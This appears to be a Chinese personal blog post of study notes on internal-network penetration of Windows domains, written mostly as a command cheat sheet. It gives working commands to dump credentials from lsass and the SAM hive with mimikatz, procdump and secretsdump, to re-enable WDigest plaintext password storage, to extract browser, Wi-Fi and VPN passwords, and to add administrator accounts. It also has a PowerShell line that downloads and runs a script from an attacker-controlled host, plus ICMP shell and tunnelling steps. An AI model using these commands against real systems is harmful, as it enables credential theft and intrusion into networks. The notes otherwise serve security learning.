<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>内网渗透学习 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">内网渗透学习</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">七月 10, 2024&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/server/">server</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于我在二进制方面还停留在汇编原理阶段，所以主要还是研究内网体系和工具利用上面，但是我感觉就算不知道具体细节，现阶段也够用</p>
<span id="more"></span>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h3><p>域控制器是域环境中核心的服务器计算机，用于在域中响应安全身份验证请求，负责允许或拒绝发出请求<br>的主机访问域内资源，以及对用户进行身份验证，存储用户账户信息并执行域的安全策略等。</p>
<h4 id="域控开放的端口"><a href="#域控开放的端口" class="headerlink" title="域控开放的端口"></a>域控开放的端口</h4><ol>
<li>53（域名系统，DNS）：域控制器使用DNS端口来提供域名解析服务，将域名映射到IP地址，以便客户端能够找到域控制器。</li>
<li>88（Kerberos）：Kerberos是Windows中用于身份验证的协议。域控制器使用Kerberos端口来进行用户身份验证和票据颁发(黄金票据和白银票据)。</li>
<li>135（远程过程调用，RPC）：域控制器使用RPC端口来提供远程管理服务，例如用户和组策略的管理。</li>
<li>389（轻量级目录访问协议，LDAP）：LDAP是用于访问和维护目录服务的协议。域控制器使用LDAP端口提供对Active Directory的访问和搜索功能。</li>
<li>445（服务器消息块，SMB）：SMB协议用于文件和打印机共享以及其他网络通信。域控制器使用SMB端口来提供文件共享和系统管理功能。</li>
</ol>
<p><strong>辅域</strong>：通常指的是在网络环境中作为主域控制器备份的域控制器。这些控制器在功能上辅助主域控制器，确保在主域控制器故障时能够接管关键服务</p>
<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h3><p>活动目录是一种目录服务数据库，区别于常见的关系型数据库。目录数据库实现是目录服务，是一个帮助<br>用户快速，准确地从目录中找到所需要信息的服务。目录数据库将所有数据库组织成一个有层次的树状结<br>构，其中的每一个节点是一个对象，用户可以根据这个对象名称去查找这个对象的有关信息。<br><strong>如果那台机器装了AD他就变成DC</strong></p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>从组的使用范围来分，可以分为三种：<strong>全局组</strong>、<strong>本地域组</strong>和<strong>通用组</strong>。</p>
<ol>
<li><p>域本地组 域本地组主要用于本域内资源的访问权限，如<strong>Administrators：管理员组</strong>,该组的成员对服务器具有完全的控制权，并可以根据需要向用户分配用户权限和访问控制权限。<strong>Account Operators：账号操作员组</strong>，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器</p>
</li>
<li><p>通用组   可以在该域林的任何域中指派权限，适合在域森林内的跨域访问中使用。</p>
</li>
<li><p>全局组   全局组只能包含本域内的用户账户，全局组的使用范围是本域以及受信任关系的其他域。如<strong>Domain Admins，域管理员组</strong>，Domain Users，域用户</p>
</li>
<li><p>当服务器加入域时，<strong>域管理员</strong>默认对域内所有机器都具有管理权限，这是因为域的<strong>Domain Admins组</strong>默认会被添加到域内所有机器的本地<strong>Administrators组内</strong>。因为此组可以完全控制服务器。<strong>administrator帐户</strong>是Administrators组的一个默认本地成员,权限默认仅限于本地计算机</p>
</li>
<li><p><strong>域用户账户</strong>是在域内全局组 <strong>Domain Users组</strong>中，本地用户账户在本地 <strong>User组</strong>中。当计算机加入域时，会把 Domain Users组添加到本地的 User 组中。因此域用户<strong>默认可以在域中的任何一台计算机上登录</strong></p>
</li>
<li><p><strong>机器用户（也被称为主机账号）</strong>属于域的<strong>Domain Computers组</strong>。‌机器用户是一种特殊的域用户，用户名为机器名加<code>$</code>，如：<code>WIN7$</code>、<code>WINXP$</code>,win的SYSTEM权限就对应于主机的机器用户(system和administrator权限感觉都差不多，但在一些与系统内核交互的细节上，可以看出system权限要更大一些，如<strong>HKEY_LOCAL_MACHINE\SAM</strong>)</p>
</li>
</ol>
<h3 id="win登录认证流程"><a href="#win登录认证流程" class="headerlink" title="win登录认证流程"></a>win登录认证流程</h3><p>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 认证</p>
<p>lsass.exe 负责用户登录时的身份验证，包括输入的用户名和密码验证。它处理的是本地和域账户的验证。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一般实战都是直接上传fscan</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 172.22.1.0/24</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc <span class="comment">#(跳过存活检测 、不保存文件、跳过web poc扫描)</span></span><br><span class="line">cat result.txt</span><br></pre></td></tr></table></figure>
<h3 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">systeminfo    #查看操作系统信息 </span><br><span class="line">whoami /all   #查看当前用户，sid,权限</span><br><span class="line"></span><br><span class="line">ipconfig /all #查看网络配置信息,linux是ifconfig</span><br><span class="line">netstat -ano  #查看端口连接信息</span><br><span class="line">route print   #查看主机路由信息</span><br><span class="line"></span><br><span class="line">tasklist      #查看当前进程</span><br><span class="line"></span><br><span class="line">net use       # 查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session   #查看当前主机与所连接的客户端之间的会话, 注意这里需要管理权限</span><br><span class="line">net share                             # 查看本地开启的共享</span><br><span class="line">net share ipc$                        # 开启ipc$共享</span><br><span class="line">net share ipc$ /del                   # 删除ipc$共享</span><br><span class="line">net share admin$ /del                 # 删除admin$共享</span><br><span class="line">net share c$ /del                     # 删除C盘共享</span><br><span class="line"></span><br><span class="line">net user      #查看本地用户/组信息</span><br><span class="line">net user &lt;用户名&gt; &lt;密码&gt; /add</span><br><span class="line">net user &lt;用户名&gt; /delete</span><br><span class="line"></span><br><span class="line">net localgroup administrators #查看本地管理员组</span><br><span class="line">net localgroup administrators fushuling /add #添加用户到该组</span><br><span class="line"></span><br><span class="line">tasklist /SVC #列出当前运行的进程及其关联的服务</span><br><span class="line"><span class="meta">#</span><span class="bash">Windows杀软在线查询平台</span></span><br><span class="line"><span class="meta">#</span><span class="bash">https://www.ddosi.org/av/</span></span><br><span class="line"><span class="meta">#</span><span class="bash">http://bypass.tidesec.com/bycms</span></span><br><span class="line">query user #查看在线用户</span><br><span class="line">wmic product get name,version #查询已安装软件</span><br><span class="line">wmic startup get command ,caption #查看启动程序</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="抓取用户hash"><a href="#抓取用户hash" class="headerlink" title="抓取用户hash"></a>抓取用户hash</h4><p><strong>SAM文件</strong>是Windows用户的账户数据库,位于<code>%SystemRoot%\System32\Config</code>目录中,所有本地用户的用户名, 密码的哈希值等信息都被存放在这个数据库文件中.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\system32\config\SYSTEM     <span class="comment">#system系统注册表文件，存储了系统的配置信息</span></span><br><span class="line">%SystemRoot%\system32\config\SAM        <span class="comment">#SAM文件是Windows用户的账户数据库</span></span><br><span class="line">%SystemRoot%\system32\config\SECURITY   <span class="comment">#security中存储了Lsass策略数据库</span></span><br></pre></td></tr></table></figure>
<p>普通域用户或普通工作组：<strong>SAM文件</strong>（加密后的用户密码）和 <strong>SYSTEM文件</strong>（秘钥）组合后可以提取出用户的用户名和Hash<br>域控：<strong>ntds.dit</strong> 存放了所有域用户的账号/密码（Hash）</p>
<h5 id="mimikatz读取本地用户的密码哈希"><a href="#mimikatz读取本地用户的密码哈希" class="headerlink" title="mimikatz读取本地用户的密码哈希"></a>mimikatz读取本地用户的密码哈希</h5><p>运行中的系统，需要抓取 <strong>lsass.exe</strong> 的内存，进程里边存放的是活动用户（当前登录的用户）的Hash；在域中，只要域管理员通过RDP登录过，就会将hash保存到lsass中。</p>
<p>在 windows⾥，调试权限可以⽤来调试进程，甚⾄是调试内核。(默认情况下，本地管理员组拥有这个权限)<br>对于 mimikatz 的工作原理必须要读取内存，那么只有它拥有了调试lsass.exe的权限才能去打开进程</p>
<h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span> <span class="comment">#从lsass.exe进程的内存中读取当前已登录用户的凭据</span></span><br><span class="line"><span class="comment">#privilege::debug提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment">#sekurlsa::logonpasswords导出用户凭据</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;token::elevate&quot;</span> <span class="string">&quot;lsadump::sam&quot;</span> <span class="built_in">exit</span> <span class="comment">#在线读取本地Sam文件</span></span><br><span class="line"><span class="comment"># privilege::debug,用于提升至DebugPrivilege权限</span></span><br><span class="line"><span class="comment"># token::elevate,提升至system权限</span></span><br><span class="line"><span class="comment"># lsadump::sam,用于读取SAM文件</span></span><br></pre></td></tr></table></figure>

<p>WDigest 是一种在 Windows 操作系统中用于身份验证的协议。WDigest 协议存在安全漏洞，尤其是在一些默认配置下，它将密码以明文形式存储在内存中。这意味着如果攻击者能够获取到目标计算机的内存内容<br>在 Windows 8 和 Windows Server 2012 以及更高版本中，默认情况下，WDigest 会被禁用，降低了密码明文存储的风险</p>
<p>重新用WDigest存储明文:<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<h5 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用procdump来绕过杀软对mimikatz拦截</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</span><br><span class="line"><span class="comment"># mimikatz运行解密命令</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;log&quot;</span>   <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br><span class="line">   </span><br><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br><span class="line">secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure>

<h4 id="应用中获取信息"><a href="#应用中获取信息" class="headerlink" title="应用中获取信息"></a>应用中获取信息</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#破解xshell</span></span><br><span class="line">SharpXDecrypt.exe</span><br><span class="line"><span class="comment">#RDP登录凭证</span></span><br><span class="line">netpass.exe /stext pass.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#浏览器密码</span></span><br><span class="line">hack-browser-data.exe -b all -f json --dir results --zip <span class="comment">#自动扫描当前计算机上的浏览器</span></span><br><span class="line">hack-browser-data.exe -b chrome -p <span class="string">&quot;C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default&quot;</span> <span class="comment">#自定义浏览器配置文件文件夹导出数据</span></span><br><span class="line">WebBrowserPassView.exe /stext pass.txt <span class="comment">#实测可以抓ie和火狐</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wife密码</span></span><br><span class="line">WirelessKeyView.exe /stext pass.txt</span><br><span class="line">laZagne.exe all</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</span><br><span class="line"></span><br><span class="line"><span class="comment">#vpn密码</span></span><br><span class="line">Dialupass.exe /stext pass.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程控制 如TeamViewer，SunLogin，ToDesk，Navicat</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="使用everything在内网搭建服务"><a href="#使用everything在内网搭建服务" class="headerlink" title="使用everything在内网搭建服务"></a>使用everything在内网搭建服务</h4><p>由于win查找配置文化非常困难，可以使用everything在内网搭建服务,然后代理连接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传everything.exe和 Everything.ini</span></span><br><span class="line"><span class="comment">#开启进程，添加服务</span></span><br><span class="line">everything.exe -install-client-service</span><br><span class="line"><span class="comment"># 最后搭建代码，访问http://127.0.0.1:2088/就行了</span></span><br><span class="line"><span class="comment">#也可以修改开机自启动注册表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭进程，删除服务</span></span><br><span class="line">everything.exe -uninstall-client-service</span><br></pre></td></tr></table></figure>


<h3 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h3><p>判断是否存在域环境</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all <span class="comment"># 看主DNS后缀</span></span><br><span class="line">nslookup &lt;主DNS后缀&gt; <span class="comment"># 获取DNS服务器的IP地址，一般是DC</span></span><br><span class="line"></span><br><span class="line">net config workstation   <span class="comment">#判断是否存在域环境</span></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line">systeminfo | findstr <span class="string">&quot;域:&quot;</span></span><br><span class="line">systeminfo | findstr <span class="string">&quot;Domain:&quot;</span></span><br></pre></td></tr></table></figure>
<p>需要有域用户的权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user /domain         #域用户信息</span><br><span class="line">net group /domain        #列出域内所有用户组</span><br><span class="line">net group &quot;domain admins&quot; /domain #查看域管组</span><br><span class="line"></span><br><span class="line">net accounts /domain     #域内密码策略</span><br><span class="line">nltest /DCLIST:域名      #查询所有的域控制器的主机名</span><br><span class="line">nltest /domain_trusts    #查看域信任关系</span><br></pre></td></tr></table></figure>

<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p><strong>ACL</strong> 是 <strong>Access Control List（访问控制列表）</strong>的缩写。它是一种用于管理和控制访问权限的机制或数据结构。ACL 用于确定谁可以访问特定资源（例如文件、文件夹、网络资源等）以及他们可以执行的操作</p>
<p>一些不安全的acl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GenericAll：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面</span><br><span class="line"> </span><br><span class="line">GenericWrite:更新对象的属性（例如登录脚本）</span><br><span class="line"> </span><br><span class="line">WriteOwner：更新目标对象的所有者，可以更改为攻击者控制的用户，接管对象</span><br><span class="line"> </span><br><span class="line">WriteDACL：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权</span><br><span class="line"> </span><br><span class="line">AllExtendedRights：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，能够将用户添加到组或重置密码。</span><br><span class="line"></span><br><span class="line">ForceChangePassword：强制改变当下的密码</span><br><span class="line"> </span><br><span class="line">AddMembers：可以对目标组添加用户（包括自己的账户）</span><br><span class="line"></span><br><span class="line">Self (Self-Membership)： 能够将自己添加到组中</span><br><span class="line"></span><br><span class="line">HasSIDHistory: SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限</span><br></pre></td></tr></table></figure>
<h3 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h3><h4 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ICMP探测</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot; #对网段循环ping</span><br><span class="line"><span class="meta">#</span><span class="bash">使用powershell脚本进行arp探测</span></span><br><span class="line">set-executionpolicy remotesigned；</span><br><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 192.168.92.1/24</span><br><span class="line">powshell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;);Invoke-ARPScan -CIDR 192.168.92.1/24&quot; #也可以将脚本托管在服务器上，并通过powshell远程加载运行</span><br></pre></td></tr></table></figure>
<h4 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">简单测试指定的端口号</span></span><br><span class="line">nc ip port</span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash">利用MetaSploite探测内网</span></span><br><span class="line">msfconsole</span><br><span class="line">search auxiliary/scanner </span><br></pre></td></tr></table></figure>

<h5 id="Nmap进行端口扫描"><a href="#Nmap进行端口扫描" class="headerlink" title="Nmap进行端口扫描"></a>Nmap进行端口扫描</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -PR [目标] #当目标主机与我们处于同一个网段的时候，使用ARP协议扫描技术就是最佳的选择</span><br><span class="line">nmap -PE [目标] #通过ICMP响应请求和应答进行主机发现</span><br><span class="line">nmap -sU [目标] #基于UDP协议</span><br><span class="line">nmap -sS [目标] #TCP SYN扫描</span><br><span class="line">nmap -sA [目标] #TCP ACK扫描</span><br><span class="line">nmap -sF [目标] #TCP FIN扫描</span><br><span class="line">nmap -sT [目标] # TCP Connect扫描(完成了三次握手)</span><br><span class="line">nmap -sV [目标] #版本扫描</span><br><span class="line"></span><br><span class="line">nmap -iL targets.txt路径 #扫描主机列表targets.txt中的所有目标地址</span><br></pre></td></tr></table></figure>
<p>nmap 扫描端口的结果<br>Open（开放）:nmap 发送一个 SYN 包（TCP三次握手中的第一次），目标主机回应一个 SYN+ACK 包，表示端口开放<br>Closed（关闭）:nmap 发送一个 SYN 包，目标主机回应一个 RST 包（重置连接），表示端口关闭<br>Filtered（过滤）:nmap 发送的 SYN 包，没有收到任何响应,表示目标不可达</p>
<h2 id="内网穿透与端口转发"><a href="#内网穿透与端口转发" class="headerlink" title="内网穿透与端口转发"></a>内网穿透与端口转发</h2><p><strong>端口转发</strong>是一种将来自一个IP地址和端口的网络流量重定向到另一个IP地址和端口的技术,而不进行任何修改或处理<br><strong>隧道</strong>是一种封装技术，使得一种协议的数据包能够在另一种协议中传输<br><strong>代理</strong>是一种网络服务，它代表客户端向服务器发送请求，并将服务器的响应返回给客户端。</p>
<h3 id="网络层隧道"><a href="#网络层隧道" class="headerlink" title="网络层隧道"></a>网络层隧道</h3><p>网络层主要负责数据包的传输和路由选择<br>IPv6 隧道：<br>    允许 IPv6 流量在 IPv4 网络中传输，通过封装 IPv6 数据包。</p>
<h4 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h4><p>利用 ICMP 协议（如 ping 命令）传输数据，适用于绕过防火墙。<br>icmpsh：基于 ICMP 的 shell 工具</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1		<span class="comment">#防止系统本身去响应icmp</span></span><br><span class="line">python2 icmpsh_m.py 服务端IP 客户端IP</span><br><span class="line">icmpsh.exe -t 服务端IP</span><br></pre></td></tr></table></figure>

<h3 id="传输层隧道"><a href="#传输层隧道" class="headerlink" title="传输层隧道"></a>传输层隧道</h3><p>传输层负责端到端的通信和流量控制<br>    TCP 隧道：<br>        在 TCP 连接上封装其他协议的数据，提供可靠的传输。<br>    UDP 隧道：<br>        类似于 TCP 隧道，但使用无连接的 UDP 协议，适合对延迟敏感的应用。<br>    常规端口转发：<br>        将一个端口的流量转发到另一个端口或主机，常用于远程访问服务。</p>
<h3 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a>应用层隧道</h3><p>应用层提供用户直接交互的接口</p>
<h4 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h4><p>利用 SSH 协议创建加密隧道，可以安全地转发 TCP 流量。<br><code>ssh -L 8085:172.2.118.5:80 ctfshow@pwn.challenge.ctf.show -p 28259</code><br>ctfshow上的题,直接在本地运行即可，作用是通过ssh连接，把内网的172.2.118.5:80映射到本地127.0.0.1:8085</p>
<h4 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h4><p>Port:53该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好</p>
